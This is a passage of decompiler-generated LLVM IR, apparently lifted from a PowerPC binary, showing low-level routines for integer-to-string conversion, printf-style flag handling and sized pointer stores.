  store i32 %v0_10009f74, i32* %v3_10009f74, align 4
  %v0_10009f78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f78 = load i32, i32* @r31, align 4
  %v2_10009f78 = add i32 %v1_10009f78, 16
  %v3_10009f78 = inttoptr i32 %v2_10009f78 to i32*
  store i32 %v0_10009f78, i32* %v3_10009f78, align 4
  %v0_10009f7c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009f7c

dec_label_pc_10009f7c:                            ; preds = %dec_label_pc_10009f18, %dec_label_pc_10009f60
  %v2_10009f88 = phi i32 [ %v0_10009f28, %dec_label_pc_10009f18 ], [ %v0_10009f7c.pre, %dec_label_pc_10009f60 ]
  %v1_10009f7c = inttoptr i32 %v2_10009f88 to i16*
  %v2_10009f7c = load i16, i16* %v1_10009f7c, align 2
  %v3_10009f7c = zext i16 %v2_10009f7c to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10009f84 = or i32 %v3_10009f7c, 64
  store i32 %v1_10009f84, i32* %r0.global-to-local, align 4
  %v1_10009f88 = trunc i32 %v1_10009f84 to i16
  store i16 %v1_10009f88, i16* %v1_10009f7c, align 2
  %v0_10009f8c = load i32, i32* %r0.global-to-local, align 4
  %v1_10009f8c = urem i32 %v0_10009f8c, 65536
  store i32 %v1_10009f8c, i32* %r0.global-to-local, align 4
  %v1_10009f90 = and i32 %v0_10009f8c, 2816
  store i32 %v1_10009f90, i32* %r9.global-to-local, align 4
  %v3_10009f90 = icmp eq i32 %v1_10009f90, 0
  br i1 %v3_10009f90, label %dec_label_pc_10009f98, label %dec_label_pc_10009fa0

dec_label_pc_10009f98:                            ; preds = %dec_label_pc_10009f7c
  %v0_10009f98 = load i32, i32* @r31, align 4
  %v1_10009f98 = add i32 %v0_10009f98, 12
  %v2_10009f98 = inttoptr i32 %v1_10009f98 to i32*
  %v3_10009f98 = load i32, i32* %v2_10009f98, align 4
  store i32 %v3_10009f98, i32* %r0.global-to-local, align 4
  %v2_10009f9c = add i32 %v0_10009f98, 28
  %v3_10009f9c = inttoptr i32 %v2_10009f9c to i32*
  store i32 %v3_10009f98, i32* %v3_10009f9c, align 4
  br label %dec_label_pc_10009fa0

dec_label_pc_10009fa0:                            ; preds = %dec_label_pc_10009f7c, %dec_label_pc_10009f04, %dec_label_pc_10009f98
  store i32 %v0_10009ec0, i32* %r0.global-to-local, align 4
  store i32 %v0_10009ec4, i32* @r31, align 4
  %v0_10009fb0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10009fb0

; uselistorder directives
  uselistorder i32 %v0_10009f8c, { 1, 0 }
  uselistorder i32 %v1_10009f68, { 1, 0 }
  uselistorder i32 %v0_10009f60, { 1, 0 }
  uselistorder i32 %v0_10009f28, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_10009ed0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 0, 5, 6, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 6, 7, 8, 5, 0, 1, 3, 4, 2 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009fa0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009f7c, { 1, 0 }
  uselistorder label %dec_label_pc_10009f60, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009f40, { 1, 0 }
  uselistorder label %dec_label_pc_10009ef8, { 1, 0 }
  uselistorder label %dec_label_pc_10009eec, { 1, 0 }
}

define i32 @function_10009fb4(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10009fb4:
  %v0_10009fb4 = load i32, i32* @r5, align 4
  %v1_10009fb4 = icmp slt i32 %v0_10009fb4, 0
  %v1_10009fb8 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10009ff4 = icmp eq i32 %v1_10009fb8, 0
  br i1 %v1_10009fb4, label %dec_label_pc_10009ff4, label %dec_label_pc_10009fc0

dec_label_pc_10009fc0:                            ; preds = %dec_label_pc_10009fb4
  br i1 %v3_10009ff4, label %dec_label_pc_10009fc8, label %dec_label_pc_10009ffc

dec_label_pc_10009fc8:                            ; preds = %dec_label_pc_10009fc0
  %v3_10009fc8 = icmp eq i32 %arg1, 256
  br i1 %v3_10009fc8, label %dec_label_pc_10009fd4, label %dec_label_pc_10009fdc

dec_label_pc_10009fd4:                            ; preds = %dec_label_pc_10009fc8
  br label %dec_label_pc_10009fe8

dec_label_pc_10009fdc:                            ; preds = %dec_label_pc_10009fc8
  %v3_10009fdc = icmp eq i32 %arg1, 512
  br i1 %v3_10009fdc, label %dec_label_pc_10009fe4, label %dec_label_pc_10009fe8

dec_label_pc_10009fe4:                            ; preds = %dec_label_pc_10009fdc
  br label %dec_label_pc_10009fe8

dec_label_pc_10009fe8:                            ; preds = %dec_label_pc_10009fdc, %dec_label_pc_10009fd4, %dec_label_pc_10009fe4
  ret i32 0

dec_label_pc_10009ff4:                            ; preds = %dec_label_pc_10009fb4
  br i1 %v3_10009ff4, label %dec_label_pc_1000a008, label %dec_label_pc_10009ffc

dec_label_pc_10009ffc:                            ; preds = %dec_label_pc_10009fc0, %dec_label_pc_10009ff4
  %v2_10009ffc = load i32, i32* %arg2, align 4
  ret i32 %v2_10009ffc

dec_label_pc_1000a008:                            ; preds = %dec_label_pc_10009ff4
  %v3_1000a008 = icmp eq i32 %arg1, 256
  %v2_1000a00c = load i32, i32* %arg2, align 4
  br i1 %v3_1000a008, label %dec_label_pc_1000a014, label %dec_label_pc_1000a01c

dec_label_pc_1000a014:                            ; preds = %dec_label_pc_1000a008
  %v1_1000a014 = urem i32 %v2_1000a00c, 256
  br label %dec_label_pc_1000a028

dec_label_pc_1000a01c:                            ; preds = %dec_label_pc_1000a008
  %v3_1000a01c = icmp eq i32 %arg1, 512
  br i1 %v3_1000a01c, label %dec_label_pc_1000a024, label %dec_label_pc_1000a028

dec_label_pc_1000a024:                            ; preds = %dec_label_pc_1000a01c
  %v1_1000a024 = mul i32 %v2_1000a00c, 65536
  %v2_1000a024 = sdiv i32 %v1_1000a024, 65536
  br label %dec_label_pc_1000a028

dec_label_pc_1000a028:                            ; preds = %dec_label_pc_1000a01c, %dec_label_pc_1000a014, %dec_label_pc_1000a024
  %v0_1000a028 = phi i32 [ %v2_1000a00c, %dec_label_pc_1000a01c ], [ %v1_1000a014, %dec_label_pc_1000a014 ], [ %v2_1000a024, %dec_label_pc_1000a024 ]
  %tmp = icmp slt i32 %v0_1000a028, 0
  %v1_1000a02c = zext i1 %tmp to i32
  %v2_1000a02c = ashr i32 %v0_1000a028, 31
  %v3_1000a02c = and i32 %v2_1000a02c, -2
  %v4_1000a02c = or i32 %v3_1000a02c, %v1_1000a02c
  ret i32 %v4_1000a02c

; uselistorder directives
  uselistorder i32 %v0_1000a028, { 1, 0 }
  uselistorder i32 %v2_1000a00c, { 2, 0, 1 }
  uselistorder i1 %v3_10009ff4, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000a028, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10009fe8, { 2, 0, 1 }
}

define i32 @function_1000a034(i16* %arg1) local_unnamed_addr {
dec_label_pc_1000a034:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000a034 = load i32, i32* @r4, align 4
  %v3_1000a034 = icmp eq i32 %v0_1000a034, 256
  br i1 %v3_1000a034, label %dec_label_pc_1000a040, label %dec_label_pc_1000a048

dec_label_pc_1000a040:                            ; preds = %dec_label_pc_1000a034
  %v0_1000a040 = load i32, i32* @r6, align 4
  %v1_1000a040 = trunc i32 %v0_1000a040 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_1000a040, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_1000a048:                            ; preds = %dec_label_pc_1000a034
  %v3_1000a038 = icmp eq i32 %v0_1000a034, 2048
  br i1 %v3_1000a038, label %dec_label_pc_1000a050, label %dec_label_pc_1000a05c

dec_label_pc_1000a050:                            ; preds = %dec_label_pc_1000a048
  %v0_1000a050 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000a050, i32* %tmp2, align 4
  %v0_1000a054 = load i32, i32* @r6, align 4
  %v3_1000a054 = add i32 %tmp, 4
  %v4_1000a054 = inttoptr i32 %v3_1000a054 to i32*
  store i32 %v0_1000a054, i32* %v4_1000a054, align 4
  ret i32 %tmp

dec_label_pc_1000a05c:                            ; preds = %dec_label_pc_1000a048
  %v3_1000a048 = icmp eq i32 %v0_1000a034, 512
  %v0_1000a060 = load i32, i32* @r6, align 4
  br i1 %v3_1000a048, label %dec_label_pc_1000a060, label %dec_label_pc_1000a068

dec_label_pc_1000a060:                            ; preds = %dec_label_pc_1000a05c
  %v1_1000a060 = trunc i32 %v0_1000a060 to i16
  store i16 %v1_1000a060, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_1000a068:                            ; preds = %dec_label_pc_1000a05c
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000a060, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 0, 1, 2, 4 }
}

define i32 @function_1000a070(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000a070:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000a074 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000a074 = icmp eq i32 %v0_1000a074, 0
  store i1 %v3_1000a074, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* %r30.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_1000a074, -1
  br i1 %tmp13, label %dec_label_pc_1000a0a4, label %dec_label_pc_1000a084

dec_label_pc_1000a084:                            ; preds = %dec_label_pc_1000a070
  %v0_1000a084 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a088 = sub i32 0, %v0_1000a074
  store i32 %v1_1000a088, i32* %r7.global-to-local, align 4
  %tmp14 = icmp sgt i32 %v0_1000a084, -1
  br i1 %tmp14, label %dec_label_pc_1000a0a4, label %dec_label_pc_1000a090

dec_label_pc_1000a090:                            ; preds = %dec_label_pc_1000a084
  %v0_1000a090 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000a090 = sub i32 0, %v0_1000a090
  %v2_1000a090 = sub i32 -1, %v0_1000a090
  store i32 %v1_1000a090, i32* %r6.global-to-local, align 4
  %v4_1000a090 = icmp uge i32 %v2_1000a090, %v1_1000a090
  %v1_1000a094 = sub i32 -1, %v0_1000a084
  %v3_1000a094 = zext i1 %v4_1000a090 to i32
  %v4_1000a094 = add i32 %v3_1000a094, %v1_1000a094
  store i32 %v4_1000a094, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a0a4

dec_label_pc_1000a0a4:                            ; preds = %dec_label_pc_1000a084, %dec_label_pc_1000a070, %dec_label_pc_1000a090
  %v1_1000a0a8 = phi i32 [ %v1_1000a088, %dec_label_pc_1000a090 ], [ %v0_1000a074, %dec_label_pc_1000a070 ], [ %v1_1000a088, %dec_label_pc_1000a084 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1000a090 ], [ 0, %dec_label_pc_1000a070 ], [ 0, %dec_label_pc_1000a084 ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_1000a0a8 = udiv i32 -1, %v1_1000a0a8
  store i32 %v2_1000a0a8, i32* %r8.global-to-local, align 4
  %v2_1000a0b0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000a0b0 = inttoptr i32 %v2_1000a0b0 to i8*
  store i8 0, i8* %v3_1000a0b0, align 1
  %v0_1000a0b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a0b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000a0b4 = mul i32 %v1_1000a0b4, %v0_1000a0b4
  %v1_1000a0b8 = sub i32 0, %v2_1000a0b4
  store i32 %v1_1000a0b8, i32* %r31.global-to-local, align 4
  %v4_1000a0bc = icmp eq i32 %v1_1000a0b4, %v1_1000a0b8
  br i1 %v4_1000a0bc, label %dec_label_pc_1000a0c4, label %dec_label_pc_1000a0cc

dec_label_pc_1000a0c4:                            ; preds = %dec_label_pc_1000a0a4
  %v1_1000a0c4 = add i32 %v0_1000a0b4, 1
  store i32 %v1_1000a0c4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a0cc

dec_label_pc_1000a0cc:                            ; preds = %dec_label_pc_1000a0a4, %dec_label_pc_1000a0c4
  %v0_1000a0cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a0cc, i32* %r12.global-to-local, align 4
  %v0_1000a0d0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1000a0d0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a0d4

dec_label_pc_1000a0d4thread-pre-split:            ; preds = %dec_label_pc_1000a128
  %v0_1000a0d4.pr = load i32, i32* %r12.global-to-local, align 4
  %v0_1000a0d8.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a0d8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000a0d4

dec_label_pc_1000a0d4:                            ; preds = %dec_label_pc_1000a0d4thread-pre-split, %dec_label_pc_1000a0cc
  %v1_1000a11c = phi i32 [ %v1_1000a0d8.pre, %dec_label_pc_1000a0d4thread-pre-split ], [ %v1_1000a0b4, %dec_label_pc_1000a0cc ]
  %v1_1000a120 = phi i32 [ %v0_1000a0d8.pre, %dec_label_pc_1000a0d4thread-pre-split ], [ %v0_1000a0d0, %dec_label_pc_1000a0cc ]
  %v1_1000a0f0 = phi i32 [ %v0_1000a0d4.pr, %dec_label_pc_1000a0d4thread-pre-split ], [ %v0_1000a0cc, %dec_label_pc_1000a0cc ]
  %v3_1000a0d4 = icmp eq i32 %v1_1000a0f0, 0
  %v2_1000a0d8 = udiv i32 %v1_1000a120, %v1_1000a11c
  br i1 %v3_1000a0d4, label %dec_label_pc_1000a11c, label %dec_label_pc_1000a0e0

dec_label_pc_1000a0e0:                            ; preds = %dec_label_pc_1000a0d4
  %v2_1000a0e0 = udiv i32 %v1_1000a0f0, %v1_1000a11c
  %v2_1000a0e4 = mul i32 %v2_1000a0d8, %v1_1000a11c
  %v2_1000a0e8 = mul i32 %v2_1000a0e0, %v1_1000a11c
  %v2_1000a0ec = sub i32 %v1_1000a120, %v2_1000a0e4
  %v2_1000a0f0 = sub i32 %v1_1000a0f0, %v2_1000a0e8
  store i32 %v2_1000a0e0, i32* %r12.global-to-local, align 4
  %v0_1000a0f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a0f8 = mul i32 %v0_1000a0f8, %v2_1000a0f0
  %v0_1000a0fc = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0fc = mul i32 %v0_1000a0fc, %v2_1000a0f0
  %v2_1000a100 = add i32 %v2_1000a0f8, %v2_1000a0ec
  %v2_1000a104 = udiv i32 %v2_1000a100, %v1_1000a11c
  %v2_1000a108 = add i32 %v2_1000a0fc, %v2_1000a0d8
  %v2_1000a10c = mul i32 %v2_1000a104, %v1_1000a11c
  %v2_1000a110 = add i32 %v2_1000a104, %v2_1000a108
  store i32 %v2_1000a110, i32* %r11.global-to-local, align 4
  %v2_1000a114 = sub i32 %v2_1000a100, %v2_1000a10c
  store i32 %v2_1000a114, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a128

dec_label_pc_1000a11c:                            ; preds = %dec_label_pc_1000a0d4
  %v2_1000a11c = mul i32 %v2_1000a0d8, %v1_1000a11c
  %v2_1000a120 = sub i32 %v1_1000a120, %v2_1000a11c
  store i32 %v2_1000a120, i32* %r5.global-to-local, align 4
  store i32 %v2_1000a0d8, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a128

dec_label_pc_1000a128:                            ; preds = %dec_label_pc_1000a0e0, %dec_label_pc_1000a11c
  %v1_1000a130 = phi i32 [ %v2_1000a0e0, %dec_label_pc_1000a0e0 ], [ 0, %dec_label_pc_1000a11c ]
  %v0_1000a130 = phi i32 [ %v2_1000a110, %dec_label_pc_1000a0e0 ], [ %v2_1000a0d8, %dec_label_pc_1000a11c ]
  %v0_1000a134 = phi i32 [ %v2_1000a114, %dec_label_pc_1000a0e0 ], [ %v2_1000a120, %dec_label_pc_1000a11c ]
  %v1_1000a12c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a130 = or i32 %v0_1000a130, %v1_1000a130
  %v5_1000a130 = icmp eq i32 %v2_1000a130, 0
  store i1 %v5_1000a130, i1* %cr0_eq.global-to-local, align 1
  %v0_1000a138 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a138 = add i32 %v0_1000a138, -1
  store i32 %v1_1000a138, i32* %r3.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_1000a134, 10
  %v1_1000a134.v2_1000a12c.v = select i1 %tmp15, i32 48, i32 %v1_1000a12c
  %v1_1000a134.v2_1000a12c = add i32 %v0_1000a134, %v1_1000a134.v2_1000a12c.v
  %extract.t10.extract.t = trunc i32 %v1_1000a134.v2_1000a12c to i8
  %v3_1000a148 = inttoptr i32 %v1_1000a138 to i8*
  store i8 %extract.t10.extract.t, i8* %v3_1000a148, align 1
  %v0_1000a14c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000a14c, label %dec_label_pc_1000a150, label %dec_label_pc_1000a0d4thread-pre-split

dec_label_pc_1000a150:                            ; preds = %dec_label_pc_1000a128
  %v0_1000a150 = load i32, i32* @r29, align 4
  %v3_1000a150 = icmp eq i32 %v0_1000a150, 0
  br i1 %v3_1000a150, label %dec_label_pc_1000a150.dec_label_pc_1000a160_crit_edge, label %dec_label_pc_1000a158

dec_label_pc_1000a150.dec_label_pc_1000a160_crit_edge: ; preds = %dec_label_pc_1000a150
  %v0_1000a168.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a160

dec_label_pc_1000a158:                            ; preds = %dec_label_pc_1000a150
  %v2_1000a15c = load i32, i32* %r3.global-to-local, align 4
  %v3_1000a15c = add i32 %v2_1000a15c, -1
  %v4_1000a15c = inttoptr i32 %v3_1000a15c to i8*
  store i8 45, i8* %v4_1000a15c, align 1
  store i32 %v3_1000a15c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a160

dec_label_pc_1000a160:                            ; preds = %dec_label_pc_1000a150.dec_label_pc_1000a160_crit_edge, %dec_label_pc_1000a158
  %v0_1000a168 = phi i32 [ %v0_1000a168.pre, %dec_label_pc_1000a150.dec_label_pc_1000a160_crit_edge ], [ %v3_1000a15c, %dec_label_pc_1000a158 ]
  ret i32 %v0_1000a168

; uselistorder directives
  uselistorder i32 %v2_1000a104, { 1, 0 }
  uselistorder i32 %v2_1000a0e0, { 1, 2, 0 }
  uselistorder i32 %v2_1000a0d8, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_1000a11c, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_1000a0b4, { 1, 2, 0 }
  uselistorder i32 %v0_1000a0b4, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr0_eq.global-to-local, { 1, 2, 0 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a160, { 1, 0 }
  uselistorder label %dec_label_pc_1000a128, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0a4, { 2, 0, 1 }
}

define i32 @function_1000a16c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000a16c:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_1000a170 = load i32, i32* @lr, align 4
  store i32 101, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_1000a18c = add i32 %tmp, 11
  %v2_1000a18c = inttoptr i32 %v1_1000a18c to i8*
  %v3_1000a18c = load i8, i8* %v2_1000a18c, align 1
  %v4_1000a18c = zext i8 %v3_1000a18c to i32
  store i32 %v4_1000a18c, i32* %r31.global-to-local, align 4
  %v1_1000a194 = or i32 %v4_1000a18c, 32
  store i32 %v1_1000a194, i32* %r0.global-to-local, align 4
  %v1_1000a198 = icmp ult i32 %v1_1000a194, 97
  %v3_1000a198 = icmp eq i32 %v1_1000a194, 97
  store i1 %v1_1000a198, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a198, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a19c = add i32 %tmp, 4
  %v2_1000a19c = inttoptr i32 %v1_1000a19c to i32*
  %v3_1000a19c = load i32, i32* %v2_1000a19c, align 4
  store i32 %v3_1000a19c, i32* %r28.global-to-local, align 4
  %v2_1000a1a0 = load i32, i32* %arg2, align 4
  store i32 %v2_1000a1a0, i32* %r30.global-to-local, align 4
  br i1 %v3_1000a198, label %dec_label_pc_1000a1a8, label %dec_label_pc_1000a1b0

dec_label_pc_1000a1a8:                            ; preds = %dec_label_pc_1000a16c
  %v1_1000a1a8 = add nuw nsw i32 %v4_1000a18c, 6
  store i32 %v1_1000a1a8, i32* %r0.global-to-local, align 4
  %v1_1000a1ac = urem i32 %v1_1000a1a8, 256
  store i32 %v1_1000a1ac, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a1b0

dec_label_pc_1000a1b0:                            ; preds = %dec_label_pc_1000a16c, %dec_label_pc_1000a1a8
  %v0_1000a268 = phi i32 [ %v4_1000a18c, %dec_label_pc_1000a16c ], [ %v1_1000a1ac, %dec_label_pc_1000a1a8 ]
  %v1_1000a1b0 = icmp slt i32 %v2_1000a1a0, 0
  %v3_1000a1b0 = icmp eq i32 %v2_1000a1a0, 0
  store i1 %v1_1000a1b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1b0, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1000a1a0, -1
  br i1 %tmp75, label %dec_label_pc_1000a1bc, label %dec_label_pc_1000a1b8

dec_label_pc_1000a1b8:                            ; preds = %dec_label_pc_1000a1b0
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a1bc

dec_label_pc_1000a1bc:                            ; preds = %dec_label_pc_1000a1b0, %dec_label_pc_1000a1b8
  %v0_1000a37444 = phi i32 [ %v2_1000a1a0, %dec_label_pc_1000a1b0 ], [ 6, %dec_label_pc_1000a1b8 ]
  %v1_1000a1bc = add i32 %tmp, 12
  %v2_1000a1bc = inttoptr i32 %v1_1000a1bc to i32*
  %v3_1000a1bc = load i32, i32* %v2_1000a1bc, align 4
  store i32 %v3_1000a1bc, i32* %r9.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  %v1_1000a1c8 = and i32 %v3_1000a1bc, 2
  store i32 %v1_1000a1c8, i32* %r0.global-to-local, align 4
  %v3_1000a1c8 = icmp eq i32 %v1_1000a1c8, 0
  br i1 %v3_1000a1c8, label %dec_label_pc_1000a1d8, label %dec_label_pc_1000a1e4

dec_label_pc_1000a1d8:                            ; preds = %dec_label_pc_1000a1bc
  %v1_1000a1d8 = urem i32 %v3_1000a1bc, 2
  store i32 %v1_1000a1d8, i32* %r7.global-to-local, align 4
  %v3_1000a1d8 = icmp eq i32 %v1_1000a1d8, 0
  br i1 %v3_1000a1d8, label %dec_label_pc_1000a1e8, label %dec_label_pc_1000a1e4

dec_label_pc_1000a1e4:                            ; preds = %dec_label_pc_1000a1d8, %dec_label_pc_1000a1bc
  %storemerge = phi i32 [ 43, %dec_label_pc_1000a1bc ], [ 32, %dec_label_pc_1000a1d8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_1000a1e4 = trunc i32 %storemerge to i8
  store i8 %v6_1000a1e4, i8* %stack_var_-200, align 1
  br label %dec_label_pc_1000a1e8

dec_label_pc_1000a1e8:                            ; preds = %dec_label_pc_1000a1d8, %dec_label_pc_1000a1e4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000a1b0, label %dec_label_pc_1000a34c, label %dec_label_pc_1000a264

dec_label_pc_1000a264:                            ; preds = %dec_label_pc_1000a1e8
  %v1_1000a268 = icmp ult i32 %v0_1000a268, 96
  %v2_1000a268 = icmp ugt i32 %v0_1000a268, 96
  %v3_1000a268 = icmp eq i32 %v0_1000a268, 96
  store i1 %v1_1000a268, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a268, i1* %cr7_eq.global-to-local, align 1
  %v2_1000a26c = add i32 %tmp, 16
  %v3_1000a26c = inttoptr i32 %v2_1000a26c to i32*
  store i32 32, i32* %v3_1000a26c, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_1000a268, label %dec_label_pc_1000a290, label %dec_label_pc_1000a284

dec_label_pc_1000a284:                            ; preds = %dec_label_pc_1000a264
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a290

dec_label_pc_1000a290:                            ; preds = %dec_label_pc_1000a264, %dec_label_pc_1000a284
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f840.303 to i32), i32 8), %dec_label_pc_1000a264 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f840.303 to i32), i32 12), %dec_label_pc_1000a284 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1000f840.303 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a29c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000a29c, i32* %r8.global-to-local, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a73c

dec_label_pc_1000a34c:                            ; preds = %dec_label_pc_1000a1e8
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_1000a350 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000a350, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_1000a39c = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_1000a370

dec_label_pc_1000a370:                            ; preds = %dec_label_pc_1000a3f0.dec_label_pc_1000a370_crit_edge, %dec_label_pc_1000a34c
  %v0_1000a374 = phi i32 [ %v0_1000a374.pre, %dec_label_pc_1000a3f0.dec_label_pc_1000a370_crit_edge ], [ %v0_1000a37444, %dec_label_pc_1000a34c ]
  %v3_1000a374 = call %1 @__asm_cror(i32 %v0_1000a374, i32 %tmp, i32 %v0_1000a374)
